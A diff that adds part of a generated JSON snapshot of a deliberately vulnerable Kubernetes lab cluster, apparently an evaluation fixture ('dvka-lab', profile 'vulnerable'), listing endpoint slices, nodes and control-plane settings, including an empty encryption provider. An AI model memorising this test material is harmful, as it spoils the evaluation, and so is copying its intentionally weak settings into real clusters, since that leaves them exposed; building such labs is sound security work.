+  {
+   "apiVersion": "discovery.k8s.io/v1",
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "neg-lb-restricted-4lhb5",
+    "namespace": "dvka-secure",
+    "labels": {
+     "kubernetes.io/service-name": "neg-lb-restricted"
+    }
+   },
+   "addressType": "IPv4",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.244.0.43"
+     ],
+     "conditions": {
+      "ready": true
+     },
+     "targetRef": {
+      "kind": "Pod",
+      "name": "neg-api-ktxknd2qlw-pm9rc",
+      "namespace": "dvka-secure"
+     }
+    }
+   ]
+  },
+  {
+   "apiVersion": "discovery.k8s.io/v1",
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "ap-frontend-bz24k",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "kubernetes.io/service-name": "ap-frontend"
+    }
+   },
+   "addressType": "IPv4",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.244.0.40"
+     ],
+     "conditions": {
+      "ready": true
+     },
+     "targetRef": {
+      "kind": "Pod",
+      "name": "ap-frontend-djt8xmmh7m-bz24k",
+      "namespace": "dvka-vuln"
+     }
+    }
+   ]
+  },
+  {
+   "apiVersion": "discovery.k8s.io/v1",
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "prio-isolated-mcrbl",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "kubernetes.io/service-name": "prio-isolated"
+    }
+   },
+   "addressType": "IPv4",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.244.0.41"
+     ],
+     "conditions": {
+      "ready": true
+     },
+     "targetRef": {
+      "kind": "Pod",
+      "name": "prio-isolated-5l6wcsx8jb-mcrbl",
+      "namespace": "dvka-vuln"
+     }
+    }
+   ]
+  },
+  {
+   "apiVersion": "discovery.k8s.io/v1",
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "prio-vuln-exposed-vfdlv",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "kubernetes.io/service-name": "prio-vuln-exposed"
+    }
+   },
+   "addressType": "IPv4",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.244.0.42"
+     ],
+     "conditions": {
+      "ready": true
+     },
+     "targetRef": {
+      "kind": "Pod",
+      "name": "prio-vuln-exposed-lxt7bcwllq-vfdlv",
+      "namespace": "dvka-vuln"
+     }
+    }
+   ]
+  }
+ ],
+ "nodes": [
+  {
+   "kind": "Node",
+   "metadata": {
+    "name": "control-1",
+    "labels": {
+     "kubernetes.io/hostname": "control-1",
+     "node-role.kubernetes.io/control-plane": ""
+    }
+   },
+   "status": {
+    "conditions": [
+     {
+      "type": "Ready",
+      "status": "True"
+     }
+    ],
+    "nodeInfo": {
+     "kubeletVersion": "v1.29.4",
+     "osImage": "Ubuntu 22.04",
+     "containerRuntimeVersion": "containerd://1.7.13"
+    }
+   }
+  },
+  {
+   "kind": "Node",
+   "metadata": {
+    "name": "worker-1",
+    "labels": {
+     "kubernetes.io/hostname": "worker-1"
+    }
+   },
+   "status": {
+    "conditions": [
+     {
+      "type": "Ready",
+      "status": "True"
+     }
+    ],
+    "nodeInfo": {
+     "kubeletVersion": "v1.29.4",
+     "osImage": "Ubuntu 22.04",
+     "containerRuntimeVersion": "containerd://1.7.13"
+    }
+   }
+  },
+  {
+   "kind": "Node",
+   "metadata": {
+    "name": "worker-2",
+    "labels": {
+     "kubernetes.io/hostname": "worker-2"
+    }
+   },
+   "status": {
+    "conditions": [
+     {
+      "type": "Ready",
+      "status": "True"
+     }
+    ],
+    "nodeInfo": {
+     "kubeletVersion": "v1.29.4",
+     "osImage": "Ubuntu 22.04",
+     "containerRuntimeVersion": "containerd://1.7.13"
+    }
+   }
+  }
+ ],
+ "componentconfig": [
+  {
+   "kind": "ComponentConfig",
+   "metadata": {
+    "name": "control-plane"
+   },
+   "spec": {
+    "version": "v1.29.4",
+    "apiServer": {
+     "anonymousAuth": false,
+     "insecurePort": 0,
+     "auditLogPath": "/var/log/audit.log",
+     "encryptionProvider": "",
+     "flags": {
+      "anonymous-auth": "false",
+      "audit-log-path": "/var/log/audit.log",
+      "audit-log-maxage": "7",
+      "audit-log-maxbackup": "2",
+      "audit-log-maxsize": "10",
+      "authorization-mode": "Node,RBAC"
+     }
+    }
+   }
+  }
+ ],
+ "_meta": {
+  "cluster": "dvka-lab",
+  "profile": "vulnerable",
+  "note": "generated by eval/dvka/build.py; do not edit"
+ }
+}
